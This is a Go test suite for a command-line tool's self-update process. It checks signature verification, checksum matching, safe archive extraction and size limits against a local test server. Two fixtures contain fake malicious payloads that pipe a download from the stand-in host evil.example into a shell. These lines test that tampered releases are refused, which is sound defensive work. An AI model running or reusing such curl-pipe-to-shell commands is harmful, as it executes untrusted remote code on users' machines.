package update

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The whole supply chain of the self-update (download, signature, checksum,
// extraction, binary replacement) used to have zero test. These tests drive the
// real functions through an httptest release origin.

type releaseOrigin struct {
	t     *testing.T
	files map[string][]byte
	hits  map[string]int
	url   string
}

func newReleaseOrigin(t *testing.T, files map[string][]byte) *releaseOrigin {
	t.Helper()
	origin := &releaseOrigin{t: t, files: files, hits: map[string]int{}}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		name := strings.TrimPrefix(r.URL.Path, "/")
		origin.hits[name]++
		body, ok := origin.files[name]
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		_, _ = w.Write(body)
	}))
	t.Cleanup(server.Close)
	origin.url = server.URL
	return origin
}

func tarGzWith(t *testing.T, name string, content []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	if err := tw.WriteHeader(&tar.Header{
		Name:     name,
		Mode:     0o755,
		Size:     int64(len(content)),
		Typeflag: tar.TypeReg,
	}); err != nil {
		t.Fatal(err)
	}
	if _, err := tw.Write(content); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func checksumsFor(assetName string, archive []byte) []byte {
	sum := sha256.Sum256(archive)
	return []byte(fmt.Sprintf("%s  %s\n", hex.EncodeToString(sum[:]), assetName))
}

// releaseFixture builds a coherent release: archive, checksums.txt and a valid
// signature from a throwaway key that the test trusts.
func releaseFixture(t *testing.T, binary []byte) (assetName string, files map[string][]byte, signer testSigner) {
	t.Helper()
	assetName, err := releaseAssetName()
	if err != nil {
		t.Fatal(err)
	}
	archive := tarGzWith(t, "clother", binary)
	checksums := checksumsFor(assetName, archive)
	signer = newTestSigner(t)
	files = map[string][]byte{
		assetName:      archive,
		checksumsAsset: checksums,
		signatureAsset: signer.sign(checksums, true),
	}
	return assetName, files, signer
}

func captureWarnings(t *testing.T) *bytes.Buffer {
	t.Helper()
	buf := &bytes.Buffer{}
	previous := warnOut
	warnOut = buf
	t.Cleanup(func() { warnOut = previous })
	return buf
}

func TestDownloadReleaseBinaryInstallsSignedArchive(t *testing.T) {
	payload := []byte("#!/bin/sh\necho the real clother\n")
	_, files, signer := releaseFixture(t, payload)
	origin := newReleaseOrigin(t, files)
	useTrustedKeys(t, signer.publicKeyFile())
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	path, cleanup, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if err != nil {
		t.Fatalf("expected a signed release to install, got %v", err)
	}
	defer cleanup()

	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, payload) {
		t.Fatalf("extracted binary = %q, want %q", got, payload)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o755 {
		t.Fatalf("extracted binary mode = %v, want 0755", info.Mode().Perm())
	}
	if origin.hits[signatureAsset] == 0 {
		t.Fatal("the signature was never fetched")
	}

	cleanup()
	if _, err := os.Stat(filepath.Dir(path)); !os.IsNotExist(err) {
		t.Fatalf("cleanup left the temporary directory behind: %v", err)
	}
}

// A signature that is published but does not verify must always abort, in every
// build, whatever the keys embedded.
func TestDownloadReleaseBinaryRefusesForgedSignature(t *testing.T) {
	_, files, _ := releaseFixture(t, []byte("payload"))
	attacker := newTestSigner(t)
	files[signatureAsset] = attacker.sign(files[checksumsAsset], true)

	origin := newReleaseOrigin(t, files)
	useTrustedKeys(t, newTestSigner(t).publicKeyFile())
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	_, _, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if err == nil {
		t.Fatal("expected a signature from an untrusted key to abort the install")
	}
	// The attacker signs with its own key while claiming the same key id, so the
	// refusal comes from the ed25519 verification itself.
	if !strings.Contains(err.Error(), "invalid release signature") {
		t.Fatalf("unexpected error: %v", err)
	}
}

// The attacker controls the origin, so it serves an archive of its choosing plus
// a matching checksums.txt. Only the signature stops it.
func TestDownloadReleaseBinaryRefusesCoherentButUnsignedPayload(t *testing.T) {
	assetName, err := releaseAssetName()
	if err != nil {
		t.Fatal(err)
	}
	evil := tarGzWith(t, "clother", []byte("#!/bin/sh\ncurl evil.example/pwn | sh\n"))
	origin := newReleaseOrigin(t, map[string][]byte{
		assetName:      evil,
		checksumsAsset: checksumsFor(assetName, evil),
		// no signature published
	})
	useTrustedKeys(t, newTestSigner(t).publicKeyFile())
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	_, _, err = downloadReleaseBinary(context.Background(), "v9.9.9")
	if err == nil {
		t.Fatal("expected a release without signature to be refused once a key is embedded")
	}
	if !strings.Contains(err.Error(), "signature") {
		t.Fatalf("unexpected error: %v", err)
	}
}

// pretendDefaultOrigin makes the code under test believe the release origin is
// the built-in GitHub one. Every test here necessarily serves from an httptest
// origin through CLOTHER_RELEASE_BASE_URL, which is exactly the condition that
// now makes a missing signature fatal, so the default-origin path has to be
// simulated to be exercised at all.
func pretendDefaultOrigin(t *testing.T) {
	t.Helper()
	previous := releaseOriginIsHandPicked
	releaseOriginIsHandPicked = func() bool { return false }
	t.Cleanup(func() { releaseOriginIsHandPicked = previous })
}

// On the default origin, until a real key is embedded, the install still
// proceeds — but never silently.
func TestDownloadReleaseBinaryWarnsLoudlyWhenNoKeyIsEmbeddedYet(t *testing.T) {
	if requireSignatureBuildFlag {
		t.Skip("built with -tags clother_strict_signatures")
	}
	assetName, files, _ := releaseFixture(t, []byte("payload"))
	delete(files, signatureAsset)
	origin := newReleaseOrigin(t, files)
	useTrustedKeys(t, []byte("untrusted comment: placeholder\n"))
	warnings := captureWarnings(t)
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)
	pretendDefaultOrigin(t)

	path, cleanup, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer cleanup()
	if path == "" {
		t.Fatal("expected the binary to be installed")
	}
	if !strings.Contains(warnings.String(), "no signature") {
		t.Fatalf("expected a loud warning, got %q", warnings.String())
	}
	_ = assetName
}

// Regression: with placeholder keys, an origin named by the environment and
// serving no signature used to install an arbitrary binary after a stderr
// warning. Controlling CLOTHER_RELEASE_BASE_URL (a shell profile, a shared CI
// configuration) was enough to replace the running clother.
func TestDownloadReleaseBinaryRefusesUnsignedHandPickedOrigin(t *testing.T) {
	assetName, err := releaseAssetName()
	if err != nil {
		t.Fatal(err)
	}
	evil := tarGzWith(t, "clother", []byte("#!/bin/sh\nexec curl https://evil.example/pwn | sh\n"))
	origin := newReleaseOrigin(t, map[string][]byte{
		assetName:      evil,
		checksumsAsset: checksumsFor(assetName, evil),
		// The attacker owns the origin, so the checksum matches its own archive.
	})
	// Placeholder keys: signatureRequired() is false, which is the state that
	// used to make this install succeed.
	useTrustedKeys(t, []byte("untrusted comment: placeholder\n"))
	warnings := captureWarnings(t)
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	path, cleanup, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if cleanup != nil {
		defer cleanup()
	}
	if err == nil {
		t.Fatalf("an unsigned hand-picked origin installed %q instead of being refused", path)
	}
	// In a strict build the refusal already comes from signatureRequired(); in
	// the default build it is the hand-picked origin that triggers it. Either
	// way the install must not happen.
	if !strings.Contains(err.Error(), "hand-picked") && !strings.Contains(err.Error(), "is not published") {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(warnings.String(), "falling back") {
		t.Fatalf("the refusal must not be a warning: %q", warnings.String())
	}
}

// The documented local-mirror workflow stays usable, but only behind an
// explicit opt-in.
func TestDownloadReleaseBinaryAllowsUnsignedOriginWhenOptedIn(t *testing.T) {
	if requireSignatureBuildFlag {
		t.Skip("built with -tags clother_strict_signatures")
	}
	_, files, _ := releaseFixture(t, []byte("payload"))
	delete(files, signatureAsset)
	origin := newReleaseOrigin(t, files)
	useTrustedKeys(t, []byte("untrusted comment: placeholder\n"))
	captureWarnings(t)
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)
	t.Setenv(allowUnsignedOriginEnv, "1")

	path, cleanup, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if err != nil {
		t.Fatalf("the explicit opt-out must keep the local mirror usable, got %v", err)
	}
	defer cleanup()
	if path == "" {
		t.Fatal("expected the binary to be installed")
	}
}

func TestDownloadReleaseBinaryRejectsTamperedArchive(t *testing.T) {
	assetName, files, signer := releaseFixture(t, []byte("payload"))
	// Same checksums.txt, correctly signed, but the archive was swapped.
	files[assetName] = tarGzWith(t, "clother", []byte("swapped payload"))
	origin := newReleaseOrigin(t, files)
	useTrustedKeys(t, signer.publicKeyFile())
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	_, _, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if err == nil {
		t.Fatal("expected a checksum mismatch")
	}
	if !strings.Contains(err.Error(), "checksum mismatch") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestDownloadReleaseBinaryRejectsMissingChecksumLine(t *testing.T) {
	_, files, signer := releaseFixture(t, []byte("payload"))
	files[checksumsAsset] = []byte("0000  some_other_asset.tar.gz\n")
	files[signatureAsset] = signer.sign(files[checksumsAsset], true)
	origin := newReleaseOrigin(t, files)
	useTrustedKeys(t, signer.publicKeyFile())
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	_, _, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if err == nil || !strings.Contains(err.Error(), "not found") {
		t.Fatalf("expected a missing checksum line to abort, got %v", err)
	}
}

func TestDownloadReleaseBinaryRejectsTruncatedGzip(t *testing.T) {
	assetName, files, signer := releaseFixture(t, []byte("payload"))
	truncated := files[assetName][:len(files[assetName])/2]
	files[assetName] = truncated
	files[checksumsAsset] = checksumsFor(assetName, truncated)
	files[signatureAsset] = signer.sign(files[checksumsAsset], true)
	origin := newReleaseOrigin(t, files)
	useTrustedKeys(t, signer.publicKeyFile())
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	if _, _, err := downloadReleaseBinary(context.Background(), "v9.9.9"); err == nil {
		t.Fatal("expected a truncated archive to abort the install")
	}
}

func TestDownloadReleaseBinaryRejectsArchiveWithoutClotherEntry(t *testing.T) {
	assetName, files, signer := releaseFixture(t, []byte("payload"))
	archive := tarGzWith(t, "README.md", []byte("nothing to see"))
	files[assetName] = archive
	files[checksumsAsset] = checksumsFor(assetName, archive)
	files[signatureAsset] = signer.sign(files[checksumsAsset], true)
	origin := newReleaseOrigin(t, files)
	useTrustedKeys(t, signer.publicKeyFile())
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	_, _, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if err == nil || !strings.Contains(err.Error(), "not found in") {
		t.Fatalf("expected an archive without a clother entry to abort, got %v", err)
	}
}

func TestDownloadReleaseBinaryFailsOnMissingArchive(t *testing.T) {
	origin := newReleaseOrigin(t, map[string][]byte{})
	t.Setenv("CLOTHER_RELEASE_BASE_URL", origin.url)

	_, _, err := downloadReleaseBinary(context.Background(), "v9.9.9")
	if err == nil {
		t.Fatal("expected a 404 on the archive to abort the install")
	}
	if !isNotFound(err) {
		t.Fatalf("expected a 404 status error, got %v", err)
	}
}

// downloadFile used to copy the body without any bound, so a hostile or broken
// origin could stream until the disk filled up.
func TestDownloadFileRefusesOversizedBody(t *testing.T) {
	const limit = 4096
	origin := newReleaseOrigin(t, map[string][]byte{
		"big.bin": bytes.Repeat([]byte("A"), limit*4),
	})

	dir := t.TempDir()
	path := filepath.Join(dir, "big.bin")
	err := downloadFile(context.Background(), origin.url+"/big.bin", path, limit)
	if err == nil {
		t.Fatal("expected an oversized body to be refused")
	}
	if !strings.Contains(err.Error(), "exceeds") {
		t.Fatalf("unexpected error: %v", err)
	}
	if _, statErr := os.Stat(path); !os.IsNotExist(statErr) {
		t.Fatal("no file must be left behind when the limit is hit")
	}
}

func TestDownloadFileAcceptsBodyAtTheLimit(t *testing.T) {
	body := bytes.Repeat([]byte("B"), 4096)
	origin := newReleaseOrigin(t, map[string][]byte{"exact.bin": body})

	path := filepath.Join(t.TempDir(), "exact.bin")
	if err := downloadFile(context.Background(), origin.url+"/exact.bin", path, int64(len(body))); err != nil {
		t.Fatalf("a body exactly at the limit must be accepted, got %v", err)
	}
	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, body) {
		t.Fatal("downloaded body differs")
	}
}

// A directory or symlink entry named "clother" used to yield an empty 0755 file
// that was then copied over the working binary.
func TestExtractBinaryRejectsNonRegularEntry(t *testing.T) {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	if err := tw.WriteHeader(&tar.Header{Name: "clother", Mode: 0o755, Typeflag: tar.TypeDir}); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}

	dir := t.TempDir()
	assetPath := filepath.Join(dir, "asset.tar.gz")
	if err := os.WriteFile(assetPath, buf.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	binaryPath := filepath.Join(dir, "clother")

	err := extractBinary(assetPath, binaryPath)
	if err == nil {
		t.Fatal("expected a non regular clother entry to be refused")
	}
	if !strings.Contains(err.Error(), "not a regular file") {
		t.Fatalf("unexpected error: %v", err)
	}
	if _, statErr := os.Stat(binaryPath); !os.IsNotExist(statErr) {
		t.Fatal("no binary must be produced from a directory entry")
	}
}

func TestExtractBinaryRejectsOversizedEntry(t *testing.T) {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	// The header announces more than the cap; the body is never written, which
	// is enough since the size is checked before any copy.
	_ = tw.WriteHeader(&tar.Header{
		Name:     "clother",
		Mode:     0o755,
		Size:     int64(maxBinaryBytes) + 1,
		Typeflag: tar.TypeReg,
	})
	_ = tw.Flush()
	_ = gz.Close()

	dir := t.TempDir()
	assetPath := filepath.Join(dir, "asset.tar.gz")
	if err := os.WriteFile(assetPath, buf.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}

	err := extractBinary(assetPath, filepath.Join(dir, "clother"))
	if err == nil || !strings.Contains(err.Error(), "exceeds") {
		t.Fatalf("expected an oversized entry to be refused, got %v", err)
	}
}
